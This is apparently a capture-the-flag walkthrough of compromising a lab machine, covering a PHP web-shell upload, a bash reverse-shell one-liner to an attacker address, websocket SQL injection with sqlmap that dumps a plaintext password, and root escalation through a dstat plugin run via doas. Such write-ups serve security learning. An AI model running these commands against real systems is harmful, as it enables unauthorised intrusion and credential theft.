![image](https://github.com/user-attachments/assets/51bcca77-3f16-46db-a196-fcd1e2d69b7e)

nmap


Discovery




https://github.com/prasathmani/tinyfilemanager



Upload shell.php




bash -c 'bash -i >& /dev/tcp/10.10.16.7/9001 0>&1'
Ctrl+U URL encode




As per nmap result port 9091 is open. What is port 9091 is using for. Check the listening port. We will see the machine is listening on port 9091 but process is hidden, so we don't know which process is running.


We only see our process, we don't see all processes.


hidepid=2 that means we cannot see processes from another user.


We will see a lot less number in proc because we don't have access to it.


So we can't enumerate port 9091 based upon the process.
So we are going to go over to nginx config.




Go to the website, sign up an account and login.


We will test sql injection. If the statement is true, it will show "Ticket Exists". If not true, it will show "Ticket Doesn't Exist". That means it is taking our input and it is vulnerable to sql injection.




Capture that request and send it to repeater. But no matter how we send the request, we won't receive the server response.


If we toggle this websocket and resend the request, we will receive server response.


We need to use SQLmap, this is boolean injection vulnerability and we don't want to do it manually because if we are going to check if one character exists at a time, it is going to take a long time to do in this repeater window.
Copy to file and name as "injection.req".



We can test this with wscat. Some web sockets require /ws but in this case it does not.


Define -u url and --data * is where you want to inject.
In this case we tested injection like this {"id":"84280 or 1=1-- -"} in above screenshots. That's why our cmd is {"id":"*"}


Then, we will use --dbs. The reason why we are using --dbs is we don't want to dump information schema and anything like that. 
Because sqlmap is very slow and take so much time, if we are going to dump every database, it will take much longer.


If we want to speed this up, we can use --threads 10.


Now we know the database name is soccer_db.


Now we can remove --dbs.
-D = database name
--dump = to dump the database


We got the database.
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+


We tried to login to website but there is nothing.


We check the users on target and we found player is a user. Thats why we will try to login SSH.






We can see the user process but not from another user.


We will check if there is somthing this user own but the results is too many.


We put grep like this to remove /proc /run /sys outputs.


We will check the group. And we found dstat. It is interesting.


We have rwx permission.


But sudo -l does not show anything.


find dstat and we found dstat is installed in these locations.


We have no suid on the application.


Doas has SUID.



GTFO bin



This is the only folder we can write.


Add the plugin. cmd from GTFO bin.


You will see the "aung" plugin was added.


We use doas with dstat because doas has SUID.
We got root.



